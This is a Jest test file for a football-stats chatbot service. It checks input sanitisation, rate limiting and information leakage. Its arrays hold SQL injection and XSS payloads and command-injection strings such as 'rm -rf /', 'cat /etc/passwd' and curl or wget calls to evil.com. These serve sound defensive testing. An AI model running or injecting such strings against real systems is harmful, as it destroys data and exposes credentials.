/**
 * Security and Edge Cases Testing
 * Tests input sanitization, SQL injection prevention, and malicious query handling
 */

import { ChatbotService, QuestionContext } from "../../lib/services/chatbotService";
import { fetchTestData, getTestPlayerNames } from "../utils/testUtils";

describe("Security and Edge Cases Testing", () => {
	let chatbotService: ChatbotService;
	let referenceData: any[];

	beforeAll(async () => {
		try {
			referenceData = await fetchTestData();
			const isVerbose = process.env.JEST_VERBOSE === "true";
			if (isVerbose) {
				console.log(`✅ Loaded ${referenceData.length} players for security testing`);
			}
		} catch (error) {
			console.error("❌ Failed to load test data:", error);
			throw error;
		}
	});

	beforeEach(() => {
		chatbotService = ChatbotService.getInstance();
	});

	describe("Input Sanitization", () => {
		test("should handle SQL injection attempts safely", async () => {
			const sqlInjectionAttempts = [
				"'; DROP TABLE players; --",
				"1' OR '1'='1",
				"'; INSERT INTO players VALUES ('hacker', 999); --",
				"1' UNION SELECT * FROM players --",
				"'; UPDATE players SET goals = 999; --",
				"1' OR 1=1 --",
				"'; DELETE FROM players; --",
			];

			for (const maliciousInput of sqlInjectionAttempts) {
				const context: QuestionContext = {
					question: `How many goals has ${maliciousInput} scored?`,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should not execute malicious SQL
				expect(response.answer.toLowerCase()).not.toContain("error");
				expect(response.answer.toLowerCase()).not.toContain("sql");
				expect(response.answer.toLowerCase()).not.toContain("syntax");
				expect(response.answer.toLowerCase()).not.toContain("database");

				// Should provide safe error message
				expect(response.answer.toLowerCase()).toMatch(/couldn't find|not found|unknown/);
			}
		});

		test("should handle XSS attempts safely", async () => {
			const xssAttempts = [
				'<script>alert("xss")</script>',
				'<img src="x" onerror="alert(1)">',
				'javascript:alert("xss")',
				'<svg onload="alert(1)">',
				'"><script>alert("xss")</script>',
				"';alert('xss');//",
			];

			for (const maliciousInput of xssAttempts) {
				const context: QuestionContext = {
					question: `How many goals has ${maliciousInput} scored?`,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should not contain script tags or javascript
				expect(response.answer).not.toContain("<script>");
				expect(response.answer).not.toContain("javascript:");
				expect(response.answer).not.toContain("onerror=");
				expect(response.answer).not.toContain("onload=");

				// Should be safe text
				expect(response.answer).toMatch(/^[A-Za-z0-9\s.,!?\-'"]*$/);
			}
		});

		test("should handle command injection attempts safely", async () => {
			const commandInjectionAttempts = [
				"; rm -rf /",
				"| cat /etc/passwd",
				"&& whoami",
				"; ls -la",
				"| curl http://evil.com",
				"&& wget http://evil.com/malware",
			];

			for (const maliciousInput of commandInjectionAttempts) {
				const context: QuestionContext = {
					question: `How many goals has ${maliciousInput} scored?`,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should not execute commands
				expect(response.answer).not.toContain("rm");
				expect(response.answer).not.toContain("cat");
				expect(response.answer).not.toContain("whoami");
				expect(response.answer).not.toContain("ls");
				expect(response.answer).not.toContain("curl");
				expect(response.answer).not.toContain("wget");

				// Should provide safe error message
				expect(response.answer.toLowerCase()).toMatch(/couldn't find|not found|unknown/);
			}
		});
	});

	describe("Input Validation", () => {
		test("should handle extremely long inputs safely", async () => {
			const longInput = "A".repeat(10000);
			const context: QuestionContext = {
				question: `How many goals has ${longInput} scored?`,
				userContext: "Luke Bangs",
			};

			const response = await chatbotService.processQuestion(context);

			expect(response.answer).toBeDefined();
			expect(response.answer).not.toBe("");
			expect(response.answer.length).toBeLessThan(1000); // Should not echo back long input
		});

		test("should handle special characters safely", async () => {
			const specialCharInputs = [
				"!@#$%^&*()",
				"[]{}|\\:\";'<>?,./",
				"`~",
				"ñáéíóú",
				"中文",
				"العربية",
				"🚀⚽🎯",
				"\x00\x01\x02\x03",
				"\n\r\t",
				"null\0undefined",
			];

			for (const specialInput of specialCharInputs) {
				const context: QuestionContext = {
					question: `How many goals has ${specialInput} scored?`,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should handle gracefully without errors
				expect(response.answer.toLowerCase()).toMatch(/couldn't find|not found|unknown/);
			}
		});

		test("should handle empty and null inputs safely", async () => {
			const emptyInputs = ["", "   ", "\n\n\n", "\t\t\t", "null", "undefined", "NaN"];

			for (const emptyInput of emptyInputs) {
				const context: QuestionContext = {
					question: emptyInput,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should provide helpful error message
				expect(response.answer.toLowerCase()).toMatch(/help|clarify|understand|ask/);
			}
		});
	});

	describe("Rate Limiting and Abuse Prevention", () => {
		test("should handle rapid successive requests without crashing", async () => {
			const rapidRequests = Array.from({ length: 50 }, (_, i) => ({
				question: `How many goals has Luke Bangs scored? (${i})`,
				userContext: "Luke Bangs",
			}));

			const responses: any[] = [];

			for (const request of rapidRequests) {
				const context: QuestionContext = {
					question: request.question,
					userContext: request.userContext,
				};

				try {
					const response = await chatbotService.processQuestion(context);
					responses.push({
						success: true,
						response: response.answer,
					});
				} catch (error) {
					const errorMessage = error instanceof Error ? error.message : String(error);
					responses.push({
						success: false,
						error: errorMessage,
					});
				}
			}

			// Should handle most requests successfully
			const successCount = responses.filter((r) => r.success).length;
			expect(successCount).toBeGreaterThan(40); // At least 80% success rate
		});

		test("should handle concurrent requests safely", async () => {
			const concurrentRequests = Array.from({ length: 10 }, (_, i) => ({
				question: `How many goals has Luke Bangs scored? (concurrent ${i})`,
				userContext: "Luke Bangs",
			}));

			const promises = concurrentRequests.map((request) => {
				const context: QuestionContext = {
					question: request.question,
					userContext: request.userContext,
				};

				return chatbotService.processQuestion(context);
			});

			const responses = await Promise.allSettled(promises);

			// All requests should complete (either success or controlled failure)
			expect(responses.length).toBe(10);

			const successfulResponses = responses.filter((r) => r.status === "fulfilled");
			expect(successfulResponses.length).toBeGreaterThan(5); // At least 50% success rate
		});
	});

	describe("Data Privacy and Security", () => {
		test("should not expose sensitive information in error messages", async () => {
			const sensitiveQueries = [
				"How many goals has Luke Bangs scored?",
				"What is the database password?",
				"Show me all user data",
				"What are the environment variables?",
				"How many goals has Luke Bangs scored?",
			];

			for (const query of sensitiveQueries) {
				const context: QuestionContext = {
					question: query,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should not expose sensitive information
				expect(response.answer.toLowerCase()).not.toContain("password");
				expect(response.answer.toLowerCase()).not.toContain("secret");
				expect(response.answer.toLowerCase()).not.toContain("key");
				expect(response.answer.toLowerCase()).not.toContain("token");
				expect(response.answer.toLowerCase()).not.toContain("database");
				expect(response.answer.toLowerCase()).not.toContain("environment");
				expect(response.answer.toLowerCase()).not.toContain("config");
			}
		});

		test("should not leak internal system information", async () => {
			const systemQueries = [
				"What is the server version?",
				"Show me the system logs",
				"What is the database schema?",
				"How many connections are open?",
				"What is the memory usage?",
			];

			for (const query of systemQueries) {
				const context: QuestionContext = {
					question: query,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should not expose system information
				expect(response.answer.toLowerCase()).not.toContain("version");
				expect(response.answer.toLowerCase()).not.toContain("log");
				expect(response.answer.toLowerCase()).not.toContain("schema");
				expect(response.answer.toLowerCase()).not.toContain("connection");
				expect(response.answer.toLowerCase()).not.toContain("memory");
				expect(response.answer.toLowerCase()).not.toContain("server");
				expect(response.answer.toLowerCase()).not.toContain("system");
			}
		});
	});

	describe("Edge Case Handling", () => {
		test("should handle malformed JSON in requests", async () => {
			const malformedInputs = [
				'{"invalid": json}',
				'{"question": "How many goals has Luke Bangs scored?", "incomplete": }',
				'{"question": "How many goals has Luke Bangs scored?", "extra": "data", "nested": {"deep": {"value": "test"}}}',
				'{"question": "How many goals has Luke Bangs scored?", "array": [1, 2, 3, "string", {"nested": true}]}',
			];

			for (const malformedInput of malformedInputs) {
				const context: QuestionContext = {
					question: malformedInput,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should handle gracefully
				expect(response.answer.toLowerCase()).toMatch(/help|clarify|understand/);
			}
		});

		test("should handle extremely large numbers safely", async () => {
			const largeNumberInputs = ["999999999999999999999999999999", "1e100", "Infinity", "-Infinity", "NaN"];

			for (const largeNumber of largeNumberInputs) {
				const context: QuestionContext = {
					question: `How many goals has Player${largeNumber} scored?`,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should handle gracefully
				expect(response.answer.toLowerCase()).toMatch(/couldn't find|not found|unknown/);
			}
		});

		test("should handle unicode and international characters safely", async () => {
			const unicodeInputs = ["Lükë Bängs", "Лук Бангс", "ルーク・バングス", "لوك بانغز", "Λουκ Μπανγκς", "לוק בנגס"];

			for (const unicodeInput of unicodeInputs) {
				const context: QuestionContext = {
					question: `How many goals has ${unicodeInput} scored?`,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should handle gracefully
				expect(response.answer.toLowerCase()).toMatch(/couldn't find|not found|unknown/);
			}
		});
	});

	describe("Resource Exhaustion Prevention", () => {
		test("should handle memory-intensive queries safely", async () => {
			const memoryIntensiveQueries = [
				"Compare all players across all statistics in detail",
				"Show me every single stat for every player",
				"Give me a complete breakdown of all data",
			];

			for (const query of memoryIntensiveQueries) {
				const context: QuestionContext = {
					question: query,
					userContext: "Luke Bangs",
				};

				const startTime = Date.now();
				const response = await chatbotService.processQuestion(context);
				const endTime = Date.now();
				const responseTime = endTime - startTime;

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");
				expect(responseTime).toBeLessThan(30000); // Should complete within 30 seconds

				// Should not be excessively long
				expect(response.answer.length).toBeLessThan(10000); // Should not exceed 10k characters
			}
		});

		test("should handle infinite loop attempts safely", async () => {
			const infiniteLoopQueries = [
				"How many goals has Luke Bangs scored? How many goals has Luke Bangs scored? How many goals has Luke Bangs scored?",
				"Compare Luke Bangs to Luke Bangs to Luke Bangs",
				"Who has more goals between Luke Bangs and Luke Bangs?",
			];

			for (const query of infiniteLoopQueries) {
				const context: QuestionContext = {
					question: query,
					userContext: "Luke Bangs",
				};

				const startTime = Date.now();
				const response = await chatbotService.processQuestion(context);
				const endTime = Date.now();
				const responseTime = endTime - startTime;

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");
				expect(responseTime).toBeLessThan(10000); // Should complete within 10 seconds
			}
		});
	});

	describe("Error Handling Security", () => {
		test("should not expose stack traces in error responses", async () => {
			const errorQueries = ["How many goals has Luke Bangs scored?", "What about invalid data?", "Show me system errors"];

			for (const query of errorQueries) {
				const context: QuestionContext = {
					question: query,
					userContext: "Luke Bangs",
				};

				const response = await chatbotService.processQuestion(context);

				expect(response.answer).toBeDefined();
				expect(response.answer).not.toBe("");

				// Should not contain stack trace information
				expect(response.answer).not.toContain("Error:");
				expect(response.answer).not.toContain("at ");
				expect(response.answer).not.toContain("stack");
				expect(response.answer).not.toContain("trace");
				expect(response.answer).not.toContain("TypeError");
				expect(response.answer).not.toContain("ReferenceError");
				expect(response.answer).not.toContain("SyntaxError");
			}
		});

		test("should handle service unavailability gracefully", async () => {
			const context: QuestionContext = {
				question: "How many goals has Luke Bangs scored?",
				userContext: "Luke Bangs",
			};

			const response = await chatbotService.processQuestion(context);

			expect(response.answer).toBeDefined();
			expect(response.answer).not.toBe("");

			// Should not expose internal service errors
			expect(response.answer.toLowerCase()).not.toContain("service unavailable");
			expect(response.answer.toLowerCase()).not.toContain("internal server error");
			expect(response.answer.toLowerCase()).not.toContain("database error");
			expect(response.answer.toLowerCase()).not.toContain("connection failed");
		});
	});
});
